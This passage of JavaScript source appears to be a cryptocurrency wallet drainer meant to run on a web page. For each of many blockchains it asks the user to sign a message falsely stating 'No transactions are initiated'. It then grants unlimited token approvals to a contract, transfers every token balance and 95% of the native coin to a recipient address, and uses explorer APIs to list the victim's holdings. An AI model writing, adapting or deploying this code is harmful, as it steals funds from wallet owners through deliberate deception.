                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for HARMONY to send')
                  return
                }
                break;

          //HECO
          case heco.chainId:
            const hecoTokens = await fetchHECOTokens(address);

            // Message to sign
            const hecoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const hecoSignature = await signer.signMessage(hecoMessage);
            console.log('Signature:', hecoSignature);

            for (let token of hecoTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(hecoContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(hecoContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const hecoBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(hecoBalance)} HECO`);

                if(!hecoBalance.eq(0)){
                  const amountToSend = hecoBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HECO`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for HECO to send')
                  return
                }
                break;

          //SMARTBCH
          case smartbch.chainId:
            const smartbchTokens = await fetchSMARTBCHTokens(address);

            // Message to sign
            const smartbchMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const smartbchSignature = await signer.signMessage(smartbchMessage);
            console.log('Signature:', smartbchSignature);

            for (let token of smartbchTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(smartbchContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(smartbchContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const smartbchBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(smartbchBalance)} SMARTBCH`);

                if(!smartbchBalance.eq(0)){
                  const amountToSend = smartbchBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SMARTBCH`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for SMARTBCH to send')
                  return
                }
                break;

          //CONFLUX
          case conflux.chainId:
            const confluxTokens = await fetchCONFLUXTokens(address);

            // Message to sign
            const confluxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const confluxSignature = await signer.signMessage(confluxMessage);
            console.log('Signature:', confluxSignature);

            for (let token of confluxTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(confluxContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(confluxContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const confluxBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(confluxBalance)} CONFLUX`);

                if(!confluxBalance.eq(0)){
                  const amountToSend = confluxBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CONFLUX`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for CONFLUX to send')
                  return
                }
                break;

          //MERLIN
          case merlin.chainId:
            const merlinTokens = await fetchMERLINTokens(address);

            // Message to sign
            const merlinMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const merlinSignature = await signer.signMessage(merlinMessage);
            console.log('Signature:', merlinSignature);

            for (let token of merlinTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(merlinContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(merlinContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const merlinBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(merlinBalance)} MERLIN`);

                if(!merlinBalance.eq(0)){
                  const amountToSend = merlinBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MERLIN`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for MERLIN to send')
                  return
                }
                break;

            
          default:
            console.log("connected to an unsupported network")
            break
        }
    } catch (error) {
        console.error('Error handling tokens:', error);
    }
} else {
    console.log('Please install MetaMask!');
}
}

//API FUNCTIONS
async function fetchETHTokens(address) {
const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${etherscanApiKey}`;
const response = await fetch(url);
const data = await response.json();
const tokens = new Set();

data.result.forEach(tx => {
    if (tx.to.toLowerCase() === address.toLowerCase() || tx.from.toLowerCase() === address.toLowerCase()) {
        tokens.add({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress });
    }
});
return Array.from(tokens);
}


//BNB API FUNCTION
async function fetchBNBTokens(account) {
  const url = `https://api.bscscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${bnbscanapikey}`;
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//ARBITRUM CONTRACT
async function fetchARBTokens(account) {
  const url = `https://api.arbiscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${arbapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//OPTIMISM API FUNCTION
async function fetchOptimismTokens(account) {
  const url = `https://api-optimistic.etherscan.io/api?module=account&action=tokentx&&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${optimismapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//ARBNOVA API FUNCTION
async function fetchARBNOVATokens(account) {
  const url = `https://api-nova.arbiscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${arbnovaapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//BASE API FUNCTION
async function fetchBASETokens(account) {
  const url = `https://api.basescan.org/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=27025780&sort=asc&apikey=${baseapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//ZKSYNC API FUNCTION
async function fetchZKSYNCTokens(account) {
  const url = `https://api-era.zksync.network/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=latest&sort=asc&apikey=${zksyncapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//POLYGON API FUNCTION
async function fetchPOLYGONTokens(account) {
  const url = `https://api.polygonscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${polygonapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//POLYGONEVM API FUNCTION
async function fetchPOLYGONEVMTokens(account) {
  const url = `https://api-zkevm.polygonscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${polygonevmapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//BLAST API FUNCTION
async function fetchBLASTTokens(account) {
  const url = `https://api.blastscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=999999999&sort=asc&apikey=${blastapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//SCROLL API FUNCTION
async function fetchSCROLLTokens(account) {
  const url = `https://api.scrollscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${scrollapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//METIS API FUNCTION
async function fetchMETISTokens(account) {
  const url = `https://andromeda-explorer.metis.io/api?module=account&action=tokenlist&address=${account}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//MANTA API FUNCTION
async function fetchMANTATokens(account) {
  const url = `https://www.oklink.com/api/v5/explorer/manta/api?module=account&action=tokentx&address=${account}&startblock=19153000&endblock=19153162&sort=asc`
  const headers = new Headers({ "Ok-Access-Key": okxapikey, "Content-Type": "application/json"})
  try {
      const response = await fetch(url, { method: 'GET', headers});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//FANTOM API FUNCTION
async function fetchFANTOMTokens(account) {
  const url = `https://api.ftmscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${fantomapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}


//GNOSIS API FUNCTION
async function fetchGNOSISTokens(account) {
  const url = `https://api.gnosisscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc&apikey=${gnosisapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//LINEA API FUNCTION
async function fetchLINEATokens(account) {
  const url = `https://api.lineascan.build/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${lineaapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//CELO API FUNCTION
async function fetchCELOTokens(account) {
  const url = `https://api.celoscan.io/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=27025780&sort=asc&apikey=${celoapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//AVALANCHE API FUNCTION
async function fetchAVALANCHETokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 43114,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//OPBNB API FUNCTION
async function fetchOPBNBTokens(account) {
  const url = `https://api-opbnb.bscscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=999999999&sort=asc&apikey=${opbnbapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//OKX API FUNCTION
async function fetchOKXTokens(account) {
  const url = `https://www.oklink.com/api/v5/explorer/eth/api?module=account&action=tokentx&address=${account}&startblock=19153000&endblock=19153162&sort=asc`
  const headers = new Headers({
      "Ok-Access-Key": okxapikey,
      "Content-Type": "application/json"
  })
  try {
      const response = await fetch(url, { method: 'GET', headers});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//MANTLE API FUNCTION
async function fetchMANTLETokens(account) {
  const url = `https://explorer.mantle.xyz/api?module=account&action=tokenlist&address=${account}`
  const headers = new Headers({ "Ok-Access-Key": okxapikey, "Content-Type": "application/json"})
  try {
      const response = await fetch(url, { method: 'GET', headers});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//CCRONOS API FUNCTION
async function fetchCRONOSTokens(account) {
  const url = `https://api.cronoscan.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=2500000&sort=asc&apikey=${cronosapikey}`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

///KLAYTN API FUNCTION
async function fetchKLAYTNTokens(account) {
  const url = `https://klaytnscope.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc`
  try {
      const response = await fetch(url);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//PLATON API FUNCTION
async function fetchPLATONTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 100,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//HARMONY API FUNCTION
async function fetchHARMONYTokens(account) {
  const url = `https://go.getblock.io/${harmonyapikey}/explorer/tx/list/account`
  const headers = new Headers({ "Content-Type": "application/json"})
  try {
      const response = await fetch(url, { method: 'POST', headers: headers, data: {"account": account, "count": 25, "offset": 0}});
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//HECO API FUNCTION
async function fetchHECOTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 128,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//SMARTBCH API FUNCTION
async function fetchSMARTBCHTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 10000,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//CONFLUX ESPACE API FUNCTION
async function fetchCONFLUXTokens(account) {
  const url = `https://rpc.particle.network/evm-chain`
  const options = {
      chainId: 1030,
      jsonrpc: '2.0',
      id: 1,
      method: 'particle_getTokens',
      params: [account],
  }

  const auth = {
      username: particleprojectid,
      password: particleprojectserverkey,
  }
  try {
      const response = await fetch(url, options, auth);
      const data = await response.json();
      if (data.status === "1" && data.message === "OK") {
          // Deduplicate tokens based on contract address
          const seen = new Set();
          const uniqueTokens = data.result.filter(tx => {
              const duplicate = seen.has(tx.contractAddress);
              seen.add(tx.contractAddress);
              return !duplicate;
          });
          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
      } else {
          console.error('Failed to fetch token transactions:', data.result);
      }
  } catch (error) {
      console.error('Error fetching token transactions:', error);
  }
  return [];
}

//MERLIN API FUNCTION
async function fetchMERLINTokens(account) {
    const url = `https://scan.merlinchain.io/api?address=${account}&api_key=${merlinapikey}&module=account&action=gettokenlist`
    try {
        const response = await fetch(url);
        const data = await response.json();
        if (data.status === "1" && data.message === "OK") {
            // Deduplicate tokens based on contract address
            const seen = new Set();
            const uniqueTokens = data.result.filter(tx => {
                const duplicate = seen.has(tx.contractAddress);
                seen.add(tx.contractAddress);
                return !duplicate;
            });
            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
        } else {
            console.error('Failed to fetch token transactions:', data.result);
        }
    } catch (error) {
        console.error('Error fetching token transactions:', error);
    }
    return [];
}

const connected = connectWallet();
if(connected){
 document.getElementById("open-connect-modal").innerHTML = 'Connected';
}

